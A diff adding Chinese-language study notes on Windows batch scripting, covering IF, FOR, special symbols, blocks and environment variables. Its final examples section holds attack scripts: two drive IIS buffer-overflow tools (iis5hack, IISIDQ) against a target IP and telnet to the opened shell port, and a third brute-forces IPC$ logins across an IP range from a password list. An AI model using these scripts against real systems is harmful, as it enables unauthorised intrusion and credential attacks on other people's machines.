@@ -1,0 +1,293 @@
+批处理：
+
+1. 注释：
+    REM 后面都被注释了
+    :: 后面的都被注释了
+
+2. 修改windows控制台语言
+    a. 临时脚本里修改
+       $ chcp 437     # 修改系统语言为英语
+       $ chcp 936     # 修改系统语言为中文
+    b. 永久修改
+       再控制台"默认值"设置属性页里的"默认代码页"中选择"437 (OEM - 美国)"
+       如果是win10的话，勾选"使用旧版控制台"
+
+3. IF
+    - IF [NOT] ERRORLEVEL number command ~
+        ERRORLEVEL 是命令执行完成后返回的退出值, number 退出值的数字取值范围0~255。
+        判断时值的排列顺序应该由大到小。返回的值大于或等于指定的值时条件成立。
+        IF ERRORLEVEL这条语句必须放在某一个命令后面。执行命令后由IF ERRORLEVEL来判断命令的返回值。
+    - IF [NOT] string1==string2 command ~
+        string1==string2 string1和string2都为字符的数据，英文字符的大小写将看做不同，这个条件中的等于号必须是2个（绝对相等），条件想等后即执行后面的 command
+    - IF [NOT] EXIST filename command ~
+        EXIST filename 为文件或目录存在的意思。
+    - IF condition command1 else command2 ~
+    NOTE： [NOT] 将返回的结果取反值即“如果没有”的意思
+    NOTE： 批处理中大于符号不能用">"而用"GTR", 比较运算符：
+            EQU - 等于
+            NEQ - 不等于
+            LSS - 小于
+            LEQ - 小于或等于
+            GTR - 大于
+            GEQ - 大于或等于
+    例子： >
+        dir C:
+        IF ERRORLEVEL 1 echo 失败
+        IF ERRORLEVEL 0 echo 成功
+        IF %1==2 echo 相等
+        IF not EXIST autoexec.bat echo 文件不存在
+
+4. FOR
+    FOR [%%c] IN (set) DO [command] [arguments] 脚本中~
+    FOR [%c]  IN (set) DO [command] [arguments] 命令行中~
+    NOTE: 循环变量名"%c"中的"c"必须是单字符
+    参数：
+        /L              该集表示以增量形式从开始到结束的一个数字序列。因此，(1,1,5) 将产生序列 1 2 3 4 5，(5,-1,1) 将产生序列 (5 4 3 2 1)。
+        /D              如果集中包含通配符，则指定与目录名匹配，而不与文件名匹配。
+        /F              从指定的文件中读取数据作为变量
+        eol=c           指一个行注释字符的结尾(就一个)
+        skip=n          指在文件开始时忽略的行数。
+        delims=xxx      指分隔符集。这个替换了空格和跳格键的默认分隔符集。
+        tokens=x,y,m-n  指每行的哪一个符号被传递到每个迭代的 for 本身。这会导致额外变量名称的分配。m-n格式为一个范围。通过 nth 符号指定 mth。如果符号字符串中的最后一个字符星号，那么额外的变量将在最后一个符号解析之后分配并接受行的保留文本。
+        usebackq        指定新语法已在下类情况中使用:在作为命令执行一个后引号的字符串并且一个单引号字符为文字字符串命令并允许在 filenameset中使用双引号扩起文件名称。
+    例子：
+        FOR /F "eol=; tokens=2,3* delims=, " %i in (myfile.txt) do @echo %i %j %k ~
+            会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将每行中的第二个和第三个符号传递给 for 程序体；用逗号和/或空格定界符号。请注意，这个 for 程序体的语句引用 %i 来取得第二个符号，引用 %j 来取得第三个符号，引用 %k来取得第三个符号后的所有剩余符号。对于带有空格的文件名，您需要用双引号将文件名括起来。为了用这种方式来使用双引号，您还需要使用 usebackq 选项，否则，双引号会被理解成是用作定义某个要分析的字符串的。
+            %i 专门在 for 语句中得到说明，%j 和 %k 是通过tokens= 选项专门得到说明的。您可以通过 tokens= 一行指定最多 26 个符号，只要不试图说明一个高于字母 'z' 或'Z' 的变量。请记住，FOR 变量名分大小写，是通用的；而且，同时不能有 52 个以上都在使用中。
+            您还可以在相邻字符串上使用 FOR /F 分析逻辑；方法是，用单引号将括号之间的 filenameset 括起来。这样，该字符串会被当作一个文件中的一个单一输入行。最后，您可以用 FOR /F 命令来分析命令的输出。方法是，将括号之间的 filenameset 变成一个反括字符串。该字符串会被当作命令行，传递到一个子 CMD.EXE，其输出会被抓进内存，并被当作文件分析。因此，以下例子:
+        FOR /F "usebackq delims==" %i IN (`set`) DO @echo %i ~
+            会枚举当前环境中的环境变量名称。
+        FOR /L %%F IN (1,1,5) DO DEL %%F.TXT ~
+        FOR %%F IN (1,2,3,4,5) DO DEL %%F.TXT ~
+            /L参数：以上2条命令执行的结果都是一样
+
+5. echo，goto，call，pause
+    echo： ~
+        回显与打印
+        echo on/off     下面的命令是否回显的开关
+        echo message    显示特定message
+    goto： ~
+        跳转，在批处理中允许以":XXX"来构建一个标号，然后用"GOTO XXX"来跳转
+        eg
+    call: ~
+        调用另外一个批处理
+        eg： call other.bat
+    pause： ~
+        暂停程序执行
+
+6. 特殊符号
+    @     关闭当前行的回显
+    >     标准输出重定向，创建方式    eg: dir > a.txt
+    >>    标准输出重定向，追加方式    eg: dir >> a.txt
+    nul   空洞文件                    eg: dir >nul
+    |     管道                        eg: dir | find "1508"
+    ^     >、<、&的转译字符           eg: echo 10 ^> 9  ::屏幕上可以正常显示"10 > 9"了
+    &     允许在一行中使用2个以上不同的命令，当第一个命令执行失败将不影响第2个命令的执行。
+    &&    允许在一行中使用2个以上不同的命令，当第一个命令执行失败后后续的命令将不会再被执行。
+    ,     符号相当于空格
+    ;     符号当命令相同的时候可以将不同的目标用;隔离开来但执行效果不变。如执行过程中发生错误则只返回错误报告但程序还是会继续执行.
+          eg: DIR C:\;D:\;E:\F:\ 相当于：DIR C:\ | DIR D:\ | DIR E:\ | DIR F:\
+
+7. 块
+    使用"()"作为if、for的命令块，例如： >
+    for %%i in %SOME% do (
+        echo %%i
+        echo ---------------------------------------------
+    )
+
+    IF %1==2 (
+        echo 相等
+        echo Yes
+    )
+
+    IF %1==2 (
+        echo a
+    ) else (    注意else前后必须有空格
+        echo b
+    )
+<    NOTE: 尽量不要使用块，因为块容易出现各种乱七八糟的问题，使用goto方式替换
+
+8. 变量
+    用户自定义变量:  ~
+        set var=value   设置变量
+        set /p var=     从标准输入中获取数据
+                        eg: set /p var=<file.txt 把变量var的值设置为file.txt里的内容
+        %var%           引用变量
+    批处理预定义变量: ~
+        %n      批处理的第n参数 n=1-9
+        %*      批处理的全部参数
+        %0      批处理文件的绝对路径
+        %~dp0   批处理文件所在目录
+    Window预定义变量: ~
+        %CD%                        当前工作目录
+        %DATE%                      系统返回当前日期。使用与 date /t 命令相同的格式。
+        %TIME%                      返回当前时间。使用与 time /t 命令相同的格式。
+        %APPDATA%                   地返回默认情况下应用程序存储数据的位置。
+        %CMDCMDLINE%                本地返回用来启动当前的
+        %CMDEXTVERSION%             系统返回当前的“命令处理程序扩展”的版本号。
+        %COMPUTERNAME%              系统返回计算机的名称。
+        %COMSPEC%                   系统返回命令行解释器可执行程序的准确路径
+        %ERRORLEVEL%                系统返回上一条命令的错误代码。通常用非零值表示错误。
+        %HOMEDRIVE%                 系统返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的
+        %HOMEPATH%                  系统返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+        %HOMESHARE%                 系统返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+        %LOGONSERVER%               本地返回验证当前登录会话的域控制器的名称
+        %NUMBER_OF_PROCESSORS%      系统指定安装在计算机上的处理器的数目。
+        %OS%                        系统返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
+        %PATH%                      系统指定可执行文件的搜索路径。
+        %PATHEXT%                   系统返回操作系统认为可执行的文件扩展名的列表
+        %PROCESSOR_ARCHITECTURE%    系统返回处理器的芯片体系结构。值：x86 或 IA64 基于Itanium x86
+        %PROCESSOR_IDENTFIER%       系统返回处理器说明。
+        %PROCESSOR_LEVEL%           系统返回计算机上安装的处理器的型号。
+        %PROCESSOR_REVISION%        系统返回处理器的版本号。
+        %PROMPT%                    本地返回当前解释程序的命令提示符设置。
+        %RANDOM%                    系统返回 0 到 32767 之间的任意十进制数字。
+        %SYSTEMDRIVE%               系统返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
+        %SYSTEMROOT%                系统返回 Windows server operating system 根目录的位置。
+        %TEMP%                      系统和用户返回对当前登录用户可用的应用程序所使用的默认临时目录。
+        %USERDOMAIN%                本地返回包含用户帐户的域的名称。
+        %USERNAME%                  本地返回当前登录的用户的名称。
+        %USERPROFILE%               本地返回当前用户的配置文件的位置。
+        %WINDIR%                    系统返回操作系统目录的位置。
+
+9. 案例
+    例1： >
+    @echo off /*关闭命令回显
+    if "%1%"=="" goto help /*判断%1是否为空，%1为目标ip
+    if "%2%"=="1" goto 1 /*判断%2是否为1，为1则跳转标志1
+    if "%2%"=="2" goto 2 /*%2为开始版本号，如果没有设置则
+    if "%2%"=="3" goto 3 /*如果存在则从匹配的地方开始执行
+    if "%2%"=="4" goto 4
+    if "%2%"=="5" goto 5
+    if "%2%"=="6" goto 6
+    if "%2%"=="7" goto 7
+    if "%2%"=="8" goto 8
+    if not EXIST iis5hack.exe goto file /*没有发现iis5hack.exe就执行标志file段内容
+    ping %1 -n 1 | find "Received = 1" /*ping目标1次，从结果中发现Received = 1
+    if errorlevel 1 goto error /*如果返回代码为1则执行error段(代码1为没有发现 0为发现并成功执行)
+    iis5hack %1 80 9 88 | find "good" /*开始溢出目标端口80 系统代码9 溢出后连接端口88 在执行结果中发现字符串”good”(溢出成功后才会有字符串good)
+    if not errorlevel 1 goto telnet /*如果没有错误代码1（溢出成功）就执行telnet段的内容。
+    echo 操作系统类型 9 失败! /否则显示这一句
+    :8 /*以下代码内容参照上面
+    iis5hack %1 80 8 88 | find "good"
+    if not errorlevel 1 goto telnet
+    echo 操作系统类型 8 失败!
+    :7
+    iis5hack %1 80 7 88 | find "good"
+    if not errorlevel 1 goto telnet
+    echo 操作系统类型 7 失败!
+    :6
+    iis5hack %1 80 6 88 | find "good"
+    if not errorlevel 1 goto telnet
+    echo 操作系统类型 6 失败!
+    :5
+    iis5hack %1 80 5 88 | find "good"
+    if not errorlevel 1 goto telnet
+    echo 操作系统类型 5 失败!
+    :4
+    iis5hack %1 80 4 88 | find "good"
+    if not errorlevel 1 goto telnet
+    echo 操作系统类型 4 失败!
+    :3
+    iis5hack %1 80 3 88 | find "good"
+    if not errorlevel 1 goto telnet
+    echo 操作系统类型 3 失败!
+    :2
+    iis5hack %1 80 2 88 | find "good"
+    if not errorlevel 1 goto telnet
+    echo 操作系统类型 2 失败!
+    :1
+    iis5hack %1 80 1 88 | find "good"
+    if not errorlevel 1 goto telnet
+    echo 操作系统类型 1 失败!
+    :0
+    iis5hack %1 80 0 88 | find "good"
+    if not errorlevel 1 goto telnet
+    echo 操作系统类型 0 失败!
+    goto error
+    :telnet
+    telnet %1 88 /*开始连接目标ip的88端口
+    goto exit /*连接中断后跳转exit段
+    :error /*error段显示错误后的帮助信息
+    echo 可能网络不能连接或者对方以修补该漏洞!请按照下面的格式手工尝试一次!
+    echo iis5hack [目标IP] [WEB端口] [系统类型] [开放端口]
+    ECHO 中文: 0
+    ECHO 中文+sp1: 1
+    ECHO 英文: 2
+    ECHO 英文+sp1: 3
+    ECHO 日语: 4
+    ECHO 日语+sp1: 5
+    ECHO 韩文: 6
+    ECHO 韩文+sp1: 7
+    ECHO 墨西哥语: 8
+    ECHO 墨西哥语+sp1: 9
+    goto exit /*跳转exit段
+    :file /*file段显示文件没有发现的信息
+    echo 文件iis5hack.exe没有发现!程序终止运行!
+    goto exit /*跳转exit段
+    :help /*help段显示本批处理的使用格式帮助
+    echo 本程序用法如下:
+    echo iis [目标ip]
+    echo iis [目标ip] [开始的号码9-0]
+    :exit /*exit段为程序出口
+
+<    例2： >
+    @echo off /*同例一
+    if not EXIST iisidq.exe goto file /*同例一
+    if %1 == "" goto error /*同例一
+    ping %1 -n 1 | find "Received = 1" /*同例一
+    if errorlevel 1 goto error1 /*同例一
+    set b=%1 /*创建一个环境变量b,将变量%1的内容传递给环境变量b。变量b的内容以后将是目标ip
+    set a=0 /*创建一个环境变量a并指定环境变量a为0。由于使用整个批处理的循环所以用a来做计数器。
+    :no /*no段开始
+    if %a%==0 set d=0 /*如果环境变量a=0则创建环境变量d设定环境变量d=0。
+    if %a%==1 set d=1 /*环境变量d其实是操作系统类型代码，用计数器来控制其
+    if %a%==2 set d=2 /*变动。
+    if %a%==3 set d=3
+    if %a%==4 set d=4
+    if %a%==5 set d=5
+    if %a%==6 set d=6
+    if %a%==7 set d=7
+    if %a%==9 set d=9
+    if %a%==10 set d=13
+    if %a%==11 set d=14
+    goto 0 /*变量传递完成后转到标志0处运行
+    :1
+    echo 正在执行第%d%项!与目标%b%不能连接!正在尝试连接请等候......
+    :0 /*标志0开始
+    IISIDQ %d% %b% 80 1 99 |find "good" /*按格式发送溢出命令并在结果中发现字符串good（发送代码成功才会有字符串good）
+    if errorlevel 1 goto 1 /*如果没有good字符串则没有发送成跳
+    /*转标志1处继续尝试发送
+    ping 127.0.0.1 -n 8 >nul /*ping自己8次相当于延时8秒不显示执
+    /*行结果
+    echo 正在执行第%d%项! /*报告正在溢出的操作系统类型
+    telnet %b% 99 /*连接溢出端口
+    echo. /*显示一个空行
+    if %d%==14 goto error1 /*如果操作系统类型为14则跳转error1处（循环出口）
+    if %d%==13 set a=11 /*开始用计数器对操作系统代码重新附值
+    if %d%==9 set a=10
+    if %d%==7 set a=9
+    if %d%==6 set a=7
+    if %d%==5 set a=6
+    if %d%==4 set a=5
+    if %d%==3 set a=4
+    if %d%==2 set a=3
+    if %d%==1 set a=2
+    if %d%==0 set a=1
+    goto no /*附值完成跳转no段执行
+    :file /*以下都是出错后的帮助提示
+    echo IIsidq.exe没有发现!将该文件和本文件放在同一目录!
+    goto exit
+    :error
+    echo 错误!目标ip不可识别!请使用下面的格式连接!
+    echo idq [目标IP]
+    goto exit
+    :error1
+    echo 连接没有成功!可能目标机器已经修补了该漏洞或者网络故障所至!
+    echo 请按照下面的格式手工尝试!
+    echo iisidq [目标类型] [目标IP] [目标端口] [连接方式] [溢出端口]
+    echo telnet [目标ip] [溢出端口]
+    :exit /*整个程序的出口
+
+<    例3： >
+    for /l %%a in (0,1,255) do for /l %%b in (0,1,255) do for /l %%c in (1,1,254) do for /f "tokens=1,2*" %%e in (userpass.txt) do net use \\%1.%%a.%%b.%%c\ipc$ %%e /u:%%f
